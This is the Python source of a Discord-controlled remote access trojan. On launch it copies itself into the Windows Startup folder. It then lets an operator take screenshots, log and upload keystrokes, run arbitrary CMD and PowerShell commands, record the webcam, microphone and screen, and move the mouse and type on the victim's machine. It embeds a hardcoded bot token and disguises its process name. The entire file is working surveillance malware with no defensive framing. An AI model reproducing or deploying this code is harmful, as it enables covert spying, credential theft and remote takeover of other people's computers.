import discord
from discord.ext import commands
import pyautogui
import cv2
import asyncio
from PIL import ImageGrab
import io
from pynput.keyboard import Listener
import os
import requests
import platform
import psutil
import GPUtil
import pyautogui
import time
import setproctitle
import shutil
import pyaudio
import wave
import os
import sys
import socket
import cv2
import asyncio
import tkinter as tk
from tkinter import messagebox
from plyer import notification
import getpass
import pyautogui
import numpy as np
import pyscreenrec

current_script_path = os.path.abspath(sys.argv[0])

destination_directory = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

destination_path = os.path.join(destination_directory, os.path.basename(current_script_path))

shutil.copy2(current_script_path, destination_path)

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

commandsList = ["!screenshot sends screenshot of users pc",
                "!keylogger enables key logger",
                "!sendkeys gives you users pressed keys in a txt",
                "!cmd <cmd_command> sends a command to CMD, !!! IF THERES SPACES IN THE COMMAND SEPARATE THEM WITH A _ !!!",
                "!ip sends the users ip adress",
                "!hardwareinfo gives you info about users hardware such as cpu ram and gpu",
                "!type <TEXT> types out the <TEXT> in the users computer, !!! IF THERES SPACES IN THE TEXT SEPARATE THEM WITH A _ !!!",
                "!mousepos <X Position> <Y Position> sets users cursor position based on given coordinates",
                "!leftclick",
                "!rightclick",
                "!doubleclick",
                "!createfile <content> <path> creates a file with the content/text of <content> on the path of <path>, something like !createfile testing C:\test.txt"
                "!webcam <time> records users webcam",
                "!sendnotification <title> <content> <timeout> sends a notification to bottom right, if u want spaces in the message separate the words with a _",
                "!microphone <time> records users microphone input",
                "!startrec <fps> records screen",
                "!stoprec stop the recording of the screen and sends it here",
                "!powershell <cmd> sends a command to windows powershell, !!! IF THERES SPACES IN THE COMMAND SEPARATE THEM WITH A _ !!!"
]

keys = []
keyloggerOn = False

class Functions:
    def capture_screenshot():
        screenshot = ImageGrab.grab()
        image_byte_array = io.BytesIO()
        screenshot.save(image_byte_array, format='PNG')
        return image_byte_array.getvalue()

    def capture_keystroke(key):
        global keys
        if keyloggerOn:
            keys.append(str(key) + "\n")
        else:
            keys = []

    def exec_cmd(command):
        os.system(str(command))

    def typeout(command):
        time.sleep(0.5)
        pyautogui.typewrite(str(command),0.05)

    def mousePos(x,y):
        time.sleep(0.5)
        pyautogui.moveTo(x,y)

    def leftclick():
        time.sleep(0.5)
        pyautogui.leftClick()

    def rightclick():
        time.sleep(0.5)
        pyautogui.rightClick()

    def doubleclick():
        time.sleep(0.5)
        pyautogui.doubleClick()

    def createfile(content, filename):
            home_directory = os.path.expanduser("~")
            path = os.path.join(home_directory, filename)

            newContent = content.replace("_", " ")

            try:
                with open(path, "w") as file:
                    file.write(newContent)
                return f"File {filename} created successfully."
            except Exception as e:
                return f"Error creating file: {str(e)}"

def keylogger_thread():
    with Listener(on_press=Functions.capture_keystroke) as listener:
        listener.join()

@bot.event
async def on_ready():
    activity = discord.Activity(name=str(getpass.getuser()), type=1)
    await bot.change_presence(status=discord.Status.idle, activity=activity)

@bot.command()
async def commandlist(ctx):
    await ctx.send(commandsList)

rec=pyscreenrec.ScreenRecorder()

@bot.command()
async def startrec(ctx,fps):
    # Use the start_recording method of the ScreenRecorder instance
    file = "recording"
    rec.start_recording(file + ".mp4", int(fps))  # 15 seconds recording duration
    await ctx.send("Recording started.")

@bot.command()
async def stoprec(ctx):
    rec.stop_recording()

    recording = "recording.mp4"
    await ctx.send("Recording finished. Sending recorded content...")
    with open(recording, "rb") as video_file:
        await ctx.send(file=discord.File(video_file, filename="video.mp4"))


@bot.command()
async def sendnotification(ctx,tit,msg,time):
    title = str(tit.replace("_"," "))
    message = str(msg.replace("_"," "))
    timeout = int(time)
    notification.notify(title=title, message=message, timeout=timeout)
    await ctx.send("sent notification to this man")

FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100
CHUNK = 1024
RECORD_SECONDS = 60

@bot.command()
async def webcam(ctx, delay: int):
    if delay <= 0:
        await ctx.send("Please provide a positive delay value.")
        return

    # Get the user who triggered the command
    user = ctx.author

    # Open a connection to the webcam
    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        await ctx.send("Could not open webcam.")
        return

    await ctx.send(f"Recording video for {delay} seconds. Smile!")

    # Define the codec and create a VideoWriter object
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    output_filename = f"{user.id}_webcam.avi"
    out = cv2.VideoWriter(output_filename, fourcc, 20.0, (640, 480))

    # Record video for the specified duration
    start_time = asyncio.get_event_loop().time()
    while (asyncio.get_event_loop().time() - start_time) < delay:
        ret, frame = cap.read()
        if not ret:
            break
        out.write(frame)

    await ctx.send("Recording finished.")

    # Release the webcam and video writer
    cap.release()
    out.release()

    # Create a discord.File from the recorded video
    recorded_video = discord.File(output_filename)

    await ctx.send("Here's your recorded video:", file=recorded_video)

    # Clean up: Delete the saved video file
    import os
    os.remove(output_filename)

@bot.command()
async def microphone(ctx,delay):
    RECORD_SECONDS = int(delay)
    # Get the user who triggered the command
    user = ctx.author

    # Initialize PyAudio
    audio = pyaudio.PyAudio()

    # Open a recording stream
    stream = audio.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        input=True,
                        frames_per_buffer=CHUNK)

    await ctx.send(f"Recording audio for {RECORD_SECONDS} seconds")

    frames = []

    # Record audio in chunks and store in frames
    for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
        data = stream.read(CHUNK)
        frames.append(data)

    await ctx.send("Recording finished.")

    # Close and terminate the stream
    stream.stop_stream()
    stream.close()
    audio.terminate()

    # Save the recorded audio to a WAV file
    output_filename = f"{user.id}_audio.wav"
    with wave.open(output_filename, 'wb') as wf:
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(audio.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))

    await ctx.send(f"Audio saved as {output_filename}")
    await ctx.send(file=discord.File(output_filename))  # Send the recorded audio file

    # Clean up: Delete the saved audio file
    import os
    os.remove(output_filename)

@bot.command()
async def screenshot(ctx):
    screenshot_bytes = Functions.capture_screenshot()
    screenshot_file = discord.File(io.BytesIO(screenshot_bytes), filename='screenshot.png')
    await ctx.send(file=screenshot_file)

@bot.command()
async def keylogger(ctx):
    global keyloggerOn
    keyloggerOn = not keyloggerOn
    await ctx.send("keylogger is now " + str(keyloggerOn))

@bot.command()
async def sendkeys(ctx):
    global keys
    keys_str = "".join(keys)
    file = discord.File(io.BytesIO(keys_str.encode()), filename="keystrokes.txt")
    await ctx.send(file=file)

@bot.command()
async def cmd(ctx, command):
    import subprocess
    newCommand = command.replace("_", " ")
    await ctx.send(str(newCommand) + " has been sent")
    
    try:
        result = subprocess.check_output(newCommand, shell=True, stderr=subprocess.STDOUT, text=True)
        output_filename = "command_output.txt"
        
        with open(output_filename, "w") as output_file:
            output_file.write(result)
            
        with open(output_filename, "rb") as file:
            await ctx.send("Command executed successfully. Output:", file=discord.File(file, filename=output_filename))
        os.remove(file)
    except subprocess.CalledProcessError as e:
        await ctx.send("Command execution failed. Error:\n```" + e.output + "```")

@bot.command()
async def powershell(ctx, command):
    import subprocess
    newCommand = command.replace("_", " ")
    await ctx.send(str(newCommand) + " has been sent")
    
    try:
        result = subprocess.check_output(newCommand, shell=True, stderr=subprocess.STDOUT, text=True)
        output_filename = "command_output.txt"
        
        with open(output_filename, "w") as output_file:
            output_file.write(result)
            
        with open(output_filename, "rb") as file:
            await ctx.send("Command executed successfully. Output:", file=discord.File(file, filename=output_filename))
        os.remove(file)
    except subprocess.CalledProcessError as e:
        await ctx.send("Command execution failed. Error:\n```" + e.output + "```")

@bot.command()
async def ip(ctx):
    IP = requests.get("http://api.ipify.org/")
    await ctx.send(str(IP.text))

@bot.command()
async def hardwareinfo(ctx):
    system_info = platform.uname()

    system = system_info.system
    machine = system_info.machine
    version = system_info.version
    cpu = platform.processor()
    memoryBytes = psutil.virtual_memory()
    memory = memoryBytes.total / (1024 ** 3)
    gpus = GPUtil.getGPUs()

    gpu = None

    for GPU in gpus:
        gpu = GPU

    drivesS = psutil.disk_partitions()

    drives = [drive.device for drive in drivesS if drive.fstype != '']

    await ctx.send(f"System -> {system}\n Machine -> {machine}\n  System Version -> {version}\n   Processor/CPU -> {cpu}\n    Memory/RAM -> {memory}\n     Graphics Card/GPU -> {gpu}\n      Drives/Disks: {drives}")


@bot.command()
async def type(ctx,command):
    newCommand = command.replace("_"," ")
    await ctx.send(str(newCommand) + " has been typed out")
    Functions.typeout(newCommand)

@bot.command()
async def mousepos(ctx,x,y):
    await ctx.send("mouse position has been set X: " + str(x) + " Y: " + str(y))
    Functions.mousePos(int(x),int(y))

@bot.command()
async def leftclick(ctx):
    await ctx.send("left mouse button clicked")
    Functions.leftclick()

@bot.command()
async def rightclick(ctx):
    await ctx.send("right mouse button clicked")
    Functions.rightclick()

@bot.command()
async def doubleclick(ctx):
    await ctx.send("double clicked mouse")
    Functions.doubleclick()

@bot.command()
async def createfile(ctx, content, path):
    result = Functions.createfile(content, path)
    await ctx.send(result)

TOKEN = "MTE0NTY5NDQ1NjQ2OTc4NjcwNQ.GS8VhK.pD3jSrBDuUYoFuW9NxYvByM-AXcdclP6sxawGw"

with Listener(on_press=Functions.capture_keystroke) as listener:
    bot.run(TOKEN)
    listener.join()
    setproctitle.setproctitle("mscservices.exe")
